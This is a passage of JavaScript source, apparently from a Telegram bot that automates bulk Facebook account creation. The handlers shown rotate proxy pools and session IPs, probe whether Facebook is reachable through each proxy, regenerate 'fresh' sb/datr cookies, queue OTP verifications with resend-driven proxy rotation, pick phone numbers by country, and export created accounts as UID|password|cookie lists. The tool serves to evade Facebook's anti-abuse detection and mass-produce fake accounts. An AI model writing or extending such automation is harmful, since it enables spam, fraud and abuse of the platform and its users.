      await renderOtpQueue(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('otp:del:') || data.startsWith('otp:skip:')) {
      const phone = data.startsWith('otp:del:') ? data.slice('otp:del:'.length) : data.slice('otp:skip:'.length);
      writeUserPending(uid, readUserPending(uid).filter((p) => p.phone !== phone));
      await renderOtpQueue(chatId, uid, msgId);
      return;
    }

    if (data === 'menu:accounts') {
      promptSessions.delete(uid);
      await renderAccountsMenu(chatId, uid, 'ready', msgId);
      return;
    }

    if (data.startsWith('accounts:view:')) {
      const view = data.slice('accounts:view:'.length);
      const filter = view === 'failed' ? 'failed' : view === 'all' ? 'all' : 'ready';
      await renderAccountsMenu(chatId, uid, filter, msgId);
      return;
    }

    if (data === 'accounts:clearconfirm') {
      await editMessage(
        chatId,
        msgId,
        [
          `⚠️ <b>CONFIRM CLEAR HISTORY</b>`,
          DIVIDER,
          `Are you sure you want to clear all account history for your Telegram ID?`,
          `<blockquote>This permanently removes your Ready, Failed, and CSV/TXT records.</blockquote>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnBad('🗑 Yes, Clear All', 'accounts:clearnow'),
              btnNav('⬅️ Back (Keep)', 'menu:accounts'),
            ],
          ],
        }
      );
      return;
    }

    if (data === 'accounts:clearnow') {
      clearUserAccounts(uid);
      await renderAccountsMenu(chatId, uid, 'ready', msgId);
      return;
    }

    if (data === 'accounts:lastcookie') {
      const allAccs = readUserAccounts(uid);
      const latest = allAccs.find((a) => a.status === 'OK') || allAccs[0];
      if (!latest) {
        await sendMessage(chatId, 'No accounts logged yet.', {
          inline_keyboard: [[btnNav('⬅️ Accounts Vault', 'menu:accounts')]],
        });
        return;
      }
      const cstr = Object.entries(latest.cookies || {}).map(([k, v]) => `${k}=${v}`).join('; ') || '-';
      const cappedCookie = cstr.length > 1800 ? cstr.slice(0, 1800) + '...' : cstr;
      await sendMessage(
        chatId,
        [
          `🔍 <b>LATEST ACCOUNT DETAILS</b>`,
          DIVIDER,
          `🔑 <b>UID|Pass:</b> <code>${escapeHtml(latest.uid || '-')}|${escapeHtml(latest.password)}</code>`,
          `📱 <b>Number:</b> <code>+${escapeHtml(latest.number)}</code>`,
          `📌 <b>Status:</b> <b>${escapeHtml(latest.status)}</b>`,
          ``,
          `<blockquote>🍪 <code>${escapeHtml(cappedCookie)}</code></blockquote>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnNav('📦 Accounts Vault', 'menu:accounts'),
              btnNav('⬅️ Main Menu', 'menu:home'),
            ],
          ],
        }
      );
      return;
    }

    if (data === 'accounts:txt') {
      const seenUids = new Set();
      const okLines = readUserAccounts(uid)
        .filter((a) => a.status === 'OK' && a.uid && !seenUids.has(a.uid) && (seenUids.add(a.uid), true))
        .map((a) => `${a.uid}|${a.password}`);
      await sendDocumentText(
        chatId,
        `NEW_ACCOUNT_SUCCESS_${uid}.txt`,
        okLines.join('\n') || 'No ready accounts yet.',
        'Ready UID|Password\n📌 অনুগ্রহ করে ডাউনলোড হয়ে গেলে বট থেকে অ্যাকাউন্ট ও কুকিজ ডিলিট করে দিন।'
      );
      await sendMessage(chatId, '📌 ফাইলটি সেভ/ডাউনলোড হয়ে গেলে বট হালকা ও নিরাপদ রাখতে অনুগ্রহ করে অ্যাকাউন্ট ও কুকিজ ডিলিট করুন:', {
        inline_keyboard: [[btnBad('🗑 অ্যাকাউন্ট ও কুকিজ ডিলিট করুন', 'pc:wipe_my_data'), btnNav('📦 Accounts Vault', 'menu:accounts')]],
      });
      return;
    }

    if (data === 'accounts:uidpasscookies') {
      const seenUids = new Set();
      const okLines = readUserAccounts(uid)
        .filter((a) => a.status === 'OK' && a.uid && !seenUids.has(a.uid) && (seenUids.add(a.uid), true))
        .map((a) => `${a.uid}|${a.password}|${formatCookieHeader(a.cookies || {})}`);
      await sendDocumentText(
        chatId,
        `UID_PASS_COOKIES_${uid}.txt`,
        okLines.join('\n') || 'No ready accounts yet.',
        `UID|Pass|Cookies (${okLines.length})\n📌 অনুগ্রহ করে ডাউনলোড হয়ে গেলে বট থেকে অ্যাকাউন্ট ও কুকিজ ডিলিট করে দিন।`
      );
      await sendMessage(chatId, '📌 ফাইলটি সেভ/ডাউনলোড হয়ে গেলে বট হালকা ও নিরাপদ রাখতে অনুগ্রহ করে অ্যাকাউন্ট ও কুকিজ ডিলিট করুন:', {
        inline_keyboard: [[btnBad('🗑 অ্যাকাউন্ট ও কুকিজ ডিলিট করুন', 'pc:wipe_my_data'), btnNav('📦 Accounts Vault', 'menu:accounts')]],
      });
      return;
    }

    if (data === 'accounts:csv') {
      const header = ['timestamp', 'name', 'number', 'password', 'uid', 'status', 'confirmed', 'cookie'].join(',');
      const rows = readUserAccounts(uid).map((a) => {
        const cstr = Object.entries(a.cookies || {}).map(([k, v]) => `${k}=${v}`).join('; ');
        return [a.ts, a.name, a.number, a.password, a.uid, a.status, a.confirmed, cstr].map(csvCell).join(',');
      });
      await sendDocumentText(
        chatId,
        `accounts_export_${uid}.csv`,
        [header, ...rows].join('\n'),
        'Full Accounts CSV\n📌 অনুগ্রহ করে ডাউনলোড হয়ে গেলে বট থেকে অ্যাকাউন্ট ও কুকিজ ডিলিট করে দিন।'
      );
      await sendMessage(chatId, '📌 ফাইলটি সেভ/ডাউনলোড হয়ে গেলে বট হালকা ও নিরাপদ রাখতে অনুগ্রহ করে অ্যাকাউন্ট ও কুকিজ ডিলিট করুন:', {
        inline_keyboard: [[btnBad('🗑 অ্যাকাউন্ট ও কুকিজ ডিলিট করুন', 'pc:wipe_my_data'), btnNav('📦 Accounts Vault', 'menu:accounts')]],
      });
      return;
    }

    if (data === 'accounts:loginsheet') {
      const header = ['number', 'uid', 'password', 'name', 'status'].join(',');
      const rows = readUserAccounts(uid)
        .filter((a) => a.uid)
        .map((a) => [a.number, a.uid, a.password, a.name, a.status].map(csvCell).join(','));
      await sendDocumentText(
        chatId,
        `login_sheet_${uid}.csv`,
        [header, ...rows].join('\n'),
        'Login Sheet CSV\n📌 অনুগ্রহ করে ডাউনলোড হয়ে গেলে বট থেকে অ্যাকাউন্ট ও কুকিজ ডিলিট করে দিন।'
      );
      await sendMessage(chatId, '📌 ফাইলটি সেভ/ডাউনলোড হয়ে গেলে বট হালকা ও নিরাপদ রাখতে অনুগ্রহ করে অ্যাকাউন্ট ও কুকিজ ডিলিট করুন:', {
        inline_keyboard: [[btnBad('🗑 অ্যাকাউন্ট ও কুকিজ ডিলিট করুন', 'pc:wipe_my_data'), btnNav('📦 Accounts Vault', 'menu:accounts')]],
      });
      return;
    }

    if (data === 'accounts:fulltxt') {
      const files = getUserFiles(uid);
      const body = fs.existsSync(files.accountsTxt) ? fs.readFileSync(files.accountsTxt, 'utf-8') : 'No accounts logged yet.';
      await sendDocumentText(
        chatId,
        `accounts_full_${uid}.txt`,
        body,
        'Full Account Blocks\n📌 অনুগ্রহ করে ডাউনলোড হয়ে গেলে বট থেকে অ্যাকাউন্ট ও কুকিজ ডিলিট করে দিন।'
      );
      await sendMessage(chatId, '📌 ফাইলটি সেভ/ডাউনলোড হয়ে গেলে বট হালকা ও নিরাপদ রাখতে অনুগ্রহ করে অ্যাকাউন্ট ও কুকিজ ডিলিট করুন:', {
        inline_keyboard: [[btnBad('🗑 অ্যাকাউন্ট ও কুকিজ ডিলিট করুন', 'pc:wipe_my_data'), btnNav('📦 Accounts Vault', 'menu:accounts')]],
      });
      return;
    }

    if (data === 'menu:proxies') {
      promptSessions.delete(uid);
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'proxies:add') {
      promptSessions.set(uid, { kind: 'awaiting_proxies' });
      await sendMessage(
        chatId,
        [
          `🌐 <b>ADD PROXIES TO POOL</b>`,
          DIVIDER,
          `Send your proxies (one per line, or 9Proxy batch copy-paste) or upload a <code>.txt</code> file:`,
          ``,
          `<blockquote><b>Supported formats:</b>\n• <code>user:pass:host:port</code> (9Proxy)\n• <code>host:port:user:pass</code>\n• <code>host:port@user:pass</code>\n• <code>http://user:pass@ip:port</code>\n• <code>socks5://ip:port</code> or <code>ip:port</code></blockquote>`,
        ].join('\n'),
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:proxies')]] }
      );
      return;
    }

    if (data === 'proxies:removeone') {
      const list = readUserProxies(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Your proxy pool is empty.', {
          inline_keyboard: [[btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      promptSessions.set(uid, { kind: 'awaiting_remove_proxy' });
      await sendMessage(chatId, `➖ Reply with the proxy line number (e.g. <code>1</code>) or exact proxy URL to remove:`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:proxies')]],
      });
      return;
    }

    if (data === 'proxies:test') {
      const list = readUserProxies(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Your proxy pool is empty. Add proxies first.', {
          inline_keyboard: [[btnOk('➕ Add Proxies', 'proxies:add'), btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      const batchSlice = list.slice(0, 25);
      await sendMessage(chatId, `🧪 Lite-probing <code>${batchSlice.length}</code> proxies concurrently (15x • ~1KB/proxy)...`);
      const results = new Array(batchSlice.length);
      let pIdx = 0;
      await Promise.all(
        Array.from({ length: Math.min(15, batchSlice.length) }, async () => {
          while (true) {
            const idx = pIdx++;
            if (idx >= batchSlice.length) break;
            results[idx] = await testProxyTcp(batchSlice[idx], true, { lite: true });
          }
        })
      );
      const liveCnt = results.filter((r) => r.ok).length;
      const lines = results.map((r, i) => {
        const geoParts = [r.geoInfo?.iso, r.geoInfo?.city].filter(Boolean).join('/');
        const meta = r.ok
          ? `${r.latencyMs}ms${r.exitIp ? ` • IP ${escapeHtml(r.exitIp)}` : ''}${geoParts ? ` (${escapeHtml(geoParts)})` : ''}`
          : `${r.latencyMs}ms${r.error ? ` • ${escapeHtml(r.error)}` : ''}`;
        return `${i + 1}. ${r.ok ? '✅ LIVE' : '❌ DEAD'} (<code>${meta}</code>)\n    <code>${escapeHtml(r.proxy)}</code>`;
      });
      await sendMessage(
        chatId,
        `🧪 <b>LIVE FACEBOOK PROXY PROBE (${liveCnt}/${results.length} LIVE)</b>\n${DIVIDER}\n${lines.join('\n')}`,
        {
          inline_keyboard: [
            [
              btnOk('⚡ Sort by Speed', 'proxies:sort'),
              btnBad('🧹 Prune Dead', 'proxies:prunedead'),
            ],
            [
              btnNav('🌐 Proxy Manager', 'menu:proxies'),
              btnNav('⬅️ Main Menu', 'menu:home'),
            ],
          ],
        }
      );
      return;
    }

    if (data === 'proxies:sort') {
      const list = readUserProxies(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Proxy pool is empty.', {
          inline_keyboard: [[btnOk('➕ Add Proxies', 'proxies:add'), btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      await sendMessage(chatId, `⚡ Lite-benchmarking <code>${list.length}</code> proxies concurrently (15x)...`);
      const results = new Array(list.length);
      let pIdx = 0;
      await Promise.all(
        Array.from({ length: Math.min(15, list.length) }, async () => {
          while (true) {
            const idx = pIdx++;
            if (idx >= list.length) break;
            results[idx] = await testProxyTcp(list[idx], false, { lite: true });
          }
        })
      );
      results.sort((a, b) => {
        if (a.ok !== b.ok) return a.ok ? -1 : 1;
        return a.latencyMs - b.latencyMs;
      });
      const ordered = results.map((r) => r.proxy);
      const liveCnt = results.filter((r) => r.ok).length;
      writeUserProxies(uid, ordered);
      await sendMessage(
        chatId,
        `⚡ <b>Sorted Proxy Pool!</b>\n✅ Live: <code>${liveCnt}/${ordered.length}</code> (fastest proxies placed at top).`
      );
      await renderProxiesMenu(chatId, uid);
      return;
    }

    if (data === 'proxies:prunedead') {
      const list = readUserProxies(uid);
      if (list.length === 0) {
        await sendMessage(chatId, '⚠️ Proxy pool is empty.', {
          inline_keyboard: [[btnOk('➕ Add Proxies', 'proxies:add'), btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      await sendMessage(chatId, `🧹 Lite-probing <code>${list.length}</code> proxies concurrently (15x)...`);
      const results = new Array(list.length);
      let pIdx = 0;
      await Promise.all(
        Array.from({ length: Math.min(15, list.length) }, async () => {
          while (true) {
            const idx = pIdx++;
            if (idx >= list.length) break;
            results[idx] = await testProxyTcp(list[idx], false, { lite: true });
          }
        })
      );
      const live = results.filter((r) => r.ok).sort((a, b) => a.latencyMs - b.latencyMs).map((r) => r.proxy);
      const removed = list.length - live.length;
      writeUserProxies(uid, live);
      await sendMessage(chatId, `✅ Removed <code>${removed}</code> dead proxies. Kept <code>${live.length}</code> live proxies (sorted fastest-first).`);
      await renderProxiesMenu(chatId, uid);
      return;
    }

    if (data === 'proxies:refresh_now') {
      const cfg = readUserConfig(uid);
      const list = readUserProxies(uid);
      if (list.length === 0 && !cfg.proxy) {
        await sendMessage(chatId, '⚠️ No proxy configured yet. Add proxies first.', {
          inline_keyboard: [[btnOk('➕ Add Proxies', 'proxies:add'), btnNav('⬅️ Proxy Manager', 'menu:proxies')]],
        });
        return;
      }
      const rotatedList = list.map((p) => {
        const res = adaptProxyForSession(p, { refreshSession: true, autoCountry: false });
        return res.url || p;
      });
      if (rotatedList.length > 0) writeUserProxies(uid, rotatedList);
      if (cfg.proxy) {
        const rDef = adaptProxyForSession(cfg.proxy, { refreshSession: true, autoCountry: false });
        if (rDef.url) writeUserConfig(uid, { proxy: rDef.url });
      }
      const probeTarget = rotatedList[0] || (cfg.proxy ? adaptProxyForSession(cfg.proxy, { refreshSession: true, autoCountry: false }).url : '');
      const cap = inspectProxyCapabilities(probeTarget);
      await sendMessage(chatId, `♻️ <i>Rotating proxy session IP &amp; lite-probing live Facebook...</i>`);
      const probe = probeTarget ? await testProxyTcp(probeTarget, true, { lite: true }) : { ok: false, error: 'no proxy' };
      const g = probe.geoInfo || {};
      const geoLine = [g.iso || cap.countryCode, g.country, g.city].filter(Boolean).join(' • ');
      await sendMessage(
        chatId,
        [
          `♻️ <b>PROXY SESSION IP REFRESHED</b>`,
          DIVIDER,
          `🆔 <b>New Session ID:</b> <code>${escapeHtml(cap.sessionId || 'rotated')}</code>  •  🌍 <b>Region:</b> <code>${escapeHtml(geoLine || 'AUTO')}</code>`,
          `🌐 <b>New Exit IP:</b> <code>${escapeHtml(probe.exitIp || (probe.ok ? 'Connected' : 'Check failed'))}</code> (${probe.latencyMs || 0}ms)`,
          g.isp ? `📡 <b>ISP:</b> <i>${escapeHtml(g.isp)}</i>` : '',
          `📊 <b>Live FB Probe:</b> ${probe.ok ? '✅ LIVE (FB Reachable)' : `❌ ${escapeHtml(probe.error || 'failed')}`}`,
        ].filter(Boolean).join('\n'),
        {
          inline_keyboard: [
            [
              btnOk('♻️ Rotate Again', 'proxies:refresh_now'),
              btnNav('🌐 Proxy Manager', 'menu:proxies'),
            ],
          ],
        }
      );
      return;
    }

    if (data === 'proxies:toggle_autorefresh') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { auto_proxy_refresh: cfg.auto_proxy_refresh === false });
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'proxies:toggle_autocountry') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { auto_proxy_country: cfg.auto_proxy_country === false });
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'proxies:toggle_pxsaver') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { proxy_saver: cfg.proxy_saver === false });
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'proxies:clear') {
      writeUserProxies(uid, []);
      await renderProxiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'menu:settings') {
      promptSessions.delete(uid);
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cc') {
      const curCc = readUserConfig(uid).cc;
      promptSessions.set(uid, { kind: 'awaiting_cc' });
      const ccBtn = (code, label) => (curCc === code ? btnOk(`✅ ${label}`, `setcc:${code}`) : btnNav(label, `setcc:${code}`));
      await sendMessage(
        chatId,
        `🌍 <b>SELECT COUNTRY CODE</b>\n${DIVIDER}\nPick a preset below or type digits directly (e.g. <code>880</code>, <code>91</code>, <code>1</code>):`,
        {
          inline_keyboard: [
            [ccBtn('880', '+880 (BD)'), ccBtn('91', '+91 (IN)'), ccBtn('92', '+92 (PK)')],
            [ccBtn('1', '+1 (US)'), ccBtn('44', '+44 (UK)'), ccBtn('60', '+60 (MY)')],
            [btnBad('❌ Cancel', 'menu:settings')],
          ],
        }
      );
      return;
    }

    if (data.startsWith('setcc:')) {
      const ccVal = data.slice('setcc:'.length).replace(/\D/g, '');
      if (ccVal) {
        promptSessions.delete(uid);
        writeUserConfig(uid, { cc: ccVal });
        await renderSettings(chatId, uid, msgId);
      }
      return;
    }

    if (data === 'set:pw') {
      promptSessions.set(uid, { kind: 'awaiting_password' });
      await sendMessage(chatId, `🔑 <b>SET DEFAULT PASSWORD</b>\nEnter the default password for created accounts (min 6 chars):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:viewpw') {
      const cfg = readUserConfig(uid);
      await sendMessage(
        chatId,
        `👁 <b>SAVED DEFAULT PASSWORD</b>\n${DIVIDER}\n<code>${cfg.password ? escapeHtml(cfg.password) : '(empty)'}</code>`,
        { inline_keyboard: [[btnNav('⚙️ Back to Settings', 'menu:settings')]] }
      );
      return;
    }

    if (data === 'set:proxy') {
      promptSessions.set(uid, { kind: 'awaiting_default_proxy' });
      await sendMessage(
        chatId,
        `🌐 <b>SET DEFAULT PROXY</b>\nEnter default proxy (e.g. <code>user:pass:host:port</code> or <code>http://user:pass@ip:port</code>), or send <code>-</code> to clear:`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]] }
      );
      return;
    }

    if (data === 'set:delay') {
      promptSessions.set(uid, { kind: 'awaiting_delay' });
      await sendMessage(chatId, `⏱ <b>SET DELAY</b>\nEnter delay in seconds between attempts (<code>0–60</code>, default <code>2</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:batch') {
      promptSessions.set(uid, { kind: 'awaiting_batch' });
      await sendMessage(chatId, `📦 <b>SET BATCH BREAK SIZE</b>\nEnter batch break size (<code>0</code> = off, default <code>0</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:retries') {
      promptSessions.set(uid, { kind: 'awaiting_retries' });
      await sendMessage(chatId, `🔁 <b>SET RETRIES</b>\nEnter number retries per account (<code>2–12</code>, default <code>4</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:timeout') {
      promptSessions.set(uid, { kind: 'awaiting_timeout' });
      await sendMessage(chatId, `⌛ <b>SET TIMEOUT</b>\nEnter HTTP request timeout in seconds (<code>5–120</code>, default <code>18</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
      });
      return;
    }

    if (data === 'set:toggle_fresh') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { fresh_id: !cfg.fresh_id });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_skip') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { skip_probe: !cfg.skip_probe });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_resume') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { resume_mode: cfg.resume_mode === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_strictpx') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { strict_proxy: cfg.strict_proxy === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_autorefresh') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { auto_proxy_refresh: cfg.auto_proxy_refresh === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_autocountry') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { auto_proxy_country: cfg.auto_proxy_country === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_gql') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { precheck_gql: cfg.precheck_gql === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cycle_engine') {
      const cfg = readUserConfig(uid);
      const order = ['hybrid', 'limited', 'classic'];
      const cur = order.indexOf(cfg.engine_mode || 'hybrid');
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { engine_mode: next });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_pxsaver') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { proxy_saver: cfg.proxy_saver === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:toggle_gqldirect') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { gql_via_direct: cfg.gql_via_direct === false });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cycle_otpresend') {
      const cfg = readUserConfig(uid);
      const order = [2, 3, 1, 0];
      const cur = order.indexOf(Number(cfg.auto_otp_resend ?? 2));
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { auto_otp_resend: next });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:turbo') {
      writeUserConfig(uid, { delay: 0, batch: 0, retries: 3, timeout: 15, threads: 6 });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cycle_threads') {
      const cfg = readUserConfig(uid);
      const order = [1, 2, 3, 4, 5, 6, 8];
      const cur = order.indexOf(Number(cfg.threads ?? 4));
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { threads: next });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'set:cycle_pxmode') {
      const cfg = readUserConfig(uid);
      const order = ['rotate', 'fastest', 'random'];
      const cur = order.indexOf(cfg.proxy_mode || 'rotate');
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { proxy_mode: next });
      await renderSettings(chatId, uid, msgId);
      return;
    }

    if (data === 'menu:diagnose') {
      promptSessions.delete(uid);
      await runAndSendDiagnose(chatId, uid);
      return;
    }

    if (data === 'menu:cookie') {
      promptSessions.delete(uid);
      await renderCookiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'cookies:regen') {
      regenUserCookies(uid);
      await renderCookiesMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'cookies:fresh_all') {
      wipeUserCookiesAndCache(uid);
      await sendMessage(
        chatId,
        [
          `🧼 <b>1-CLICK FRESH COOKIES &amp; CACHE CLEARED!</b>`,
          DIVIDER,
          `✅ Fresh Facebook <code>sb + datr</code> cookies generated`,
          `✅ Processed Done history, Logs &amp; number caches cleared`,
          `<i>All your FB sessions &amp; future IDs will stay clean &amp; fresh!</i>`,
        ].join('\n'),
        { inline_keyboard: [[btnOk('🚀 Dashboard', 'menu:home'), btnNav('🍪 Cookies Menu', 'menu:cookie')]] }
      );
      return;
    }

    if (data === 'user:wipe_all_confirm') {
      await editMessage(
        chatId,
        msgId,
        [
          `⚠️ <b>1-CLICK WIPE ALL PERSONAL DATA</b>`,
          DIVIDER,
          `This will permanently delete YOUR saved:`,
          `• All Facebook Cookies &amp; Done History`,
          `• All Saved Accounts Vault &amp; OTP Queue`,
          `• All Personal Proxies &amp; Debug Logs`,
          `<i>(Only affects your Telegram ID; other users are untouched.)</i>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [btnBad('🗑 YES, WIPE EVERYTHING NOW', 'user:wipe_all_now')],
            [btnNav('❌ Cancel', 'menu:cookie')],
          ],
        }
      );
      return;
    }

    if (data === 'user:wipe_all_now') {
      wipeAllUserData(uid);
      await editMessage(
        chatId,
        msgId,
        `✅ <b>ALL PERSONAL DATA WIPED CLEAN!</b>\n${DIVIDER}\nFresh cookies initialized and all your cookies, caches, proxies, OTP queue, logs &amp; accounts vault have been cleared.`,
        { inline_keyboard: [[btnOk('🚀 Main Dashboard', 'menu:home')]] }
      );
      return;
    }

    if (data === 'cookies:edit') {
      promptSessions.set(uid, { kind: 'awaiting_cookies' });
      await sendMessage(
        chatId,
        `🍪 <b>PASTE CUSTOM COOKIES</b>\nPaste your custom Facebook cookie header string below (e.g. <code>datr=...; sb=...; wd=360x800</code>):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:cookie')]] }
      );
      return;
    }

    if (data === 'menu:fb_auto_create' || data === 'menu:voltx' || data.startsWith('voltx:')) {
      promptSessions.delete(uid);
      await renderFbAutoCreateMenu(chatId, uid, msgId);
      return;
    }

    if (data.startsWith('fbcreate:countries:')) {
      const page = Number(data.slice('fbcreate:countries:'.length)) || 0;
      await renderFbAutoCreateMenu(chatId, uid, msgId, page);
      return;
    }

    if (data.startsWith('fbcreate:pick:')) {
      const cid = Number(data.slice('fbcreate:pick:'.length));
      if (Number.isFinite(cid)) {
        writeUserConfig(uid, { fb_create_country_id: cid });
      }
      await renderFbAutoCreateMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'fbcreate:custom_count') {
      const cfgNow = readUserConfig(uid);
      if (!cfgNow.fb_create_country_id) {
        await sendMessage(chatId, '⚠️ Select a country first.', {
          inline_keyboard: [[btnNav('⬅️ FB Auto create', 'menu:fb_auto_create')]],
        });
        return;
      }
      promptSessions.set(uid, { kind: 'awaiting_fbcreate_count', countryId: cfgNow.fb_create_country_id });
      const cObj = findCountryById(cfgNow.fb_create_country_id);
      await sendMessage(
        chatId,
        `🔢 <b>FB AUTO CREATE COUNT</b>\n🌍 Country: <b>${escapeHtml(cObj?.name || 'Selected')}</b>\nEnter how many Facebook accounts to create (<code>1–50</code>):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:fb_auto_create')]] }
      );
      return;
    }

    if (data.startsWith('fbcreate:start:')) {
      const cnt = Math.max(1, Math.min(50, Number(data.slice('fbcreate:start:'.length)) || 1));
      const cfgNow = readUserConfig(uid);
      await startFbAutoCreateRun(chatId, user, cfgNow.fb_create_country_id, cnt);
      return;
    }

    if (data === 'menu:fb_tools') {
      promptSessions.delete(uid);
      await renderFbToolsMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'fbtools:start_flow') {
      promptSessions.delete(uid);
      await renderFbToolsCountPicker(chatId, uid, msgId);
      return;
    }

    if (data === 'fbtools:pick_target') {
      promptSessions.delete(uid);
      const cfgNow = readUserConfig(uid);
      if (cfgNow.fb_tools_source === 'lamix') {
        await renderFbToolsLamixRanges(chatId, uid, 0, false, msgId);
      } else if (cfgNow.fb_tools_source === 'pool') {
        await renderFbToolsPoolCountries(chatId, uid, 0, msgId);
      } else if (cfgNow.fb_tools_source === 'custom') {
        promptSessions.set(uid, { kind: 'awaiting_fbtools_custom_nums' });
        await sendMessage(
          chatId,
          `📝 <b>কাস্টম নাম্বার পেস্ট বা ফাইল দিন</b>\n${DIVIDER}\nপ্রতি লাইনে ১টি ফোন নাম্বার দিন অথবা <code>.txt</code> ফাইল পাঠান:`,
          { inline_keyboard: [[btnBad('❌ বাতিল', 'menu:fb_tools')]] }
        );
      } else {
        await renderFbTools2oo9Ranges(chatId, uid, 0, false, msgId);
      }
      return;
    }

    if (data === 'fbtools:source_menu') {
      promptSessions.delete(uid);
      await renderFbToolsSourceMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'fbtools:server_status') {
      promptSessions.delete(uid);
      await renderFbToolsServerStatus(chatId, uid, msgId);
      return;
    }

    if (data === 'fbtools:toggle_delay') {
      const cfgNow = readUserConfig(uid);
      writeUserConfig(uid, { fb_tools_human_delay: !(cfgNow.fb_tools_human_delay === true) });
      await renderFbToolsMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'fbtools:toggle_auto_replace') {
      const cfgNow = readUserConfig(uid);
      writeUserConfig(uid, { fb_tools_auto_replace: cfgNow.fb_tools_auto_replace === false });
      await renderFbToolsMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'fbtools:otp_resends_menu') {
      const cfgNow = readUserConfig(uid);
      const curR = Math.max(1, Math.min(10, Number(cfgNow.fb_tools_otp_resends ?? 5)));
      const msg = [
        `🔁 <b>অটো OTP সেন্ড/রিসেন্ড সংখ্যা (১–১০ বার)</b>`,
        DIVIDER,
        `বর্তমান সেটিং: <code>${curR} বার</code>`,
        `প্রতিবার OTP সেন্ড/রিসেন্ড করার সময় বট অটোমেটিক সেই দেশের শর্ট নেম (ISO) দিয়ে প্রক্সি ON→OFF করে রোটেশন করবে।`,
      ].join('\n');
      const kb = {
        inline_keyboard: [
          [
            ...[1, 2, 3, 5].map((n) => (curR === n ? btnOk(`✅ ${n}x`, `fbtools:set_otp_resends:${n}`) : btnNav(`${n}x`, `fbtools:set_otp_resends:${n}`))),
          ],
          [
            ...[6, 7, 8, 10].map((n) => (curR === n ? btnOk(`✅ ${n}x`, `fbtools:set_otp_resends:${n}`) : btnNav(`${n}x`, `fbtools:set_otp_resends:${n}`))),
          ],
          [btnNav('🔢 নিজের মতো সংখ্যা লিখুন (১–১০)', 'fbtools:otp_resends_custom')],
          [btnNav('⬅️ FB Tools মেনু', 'menu:fb_tools')],
        ],
      };
      await editMessage(chatId, msgId, msg, kb);
      return;
    }

    if (data.startsWith('fbtools:set_otp_resends:')) {
      const n = Math.max(1, Math.min(10, Number(data.slice('fbtools:set_otp_resends:'.length)) || 5));
      writeUserConfig(uid, { fb_tools_otp_resends: n });
      await renderFbToolsMenu(chatId, uid, msgId);
      return;
    }

    if (data === 'fbtools:otp_resends_custom') {
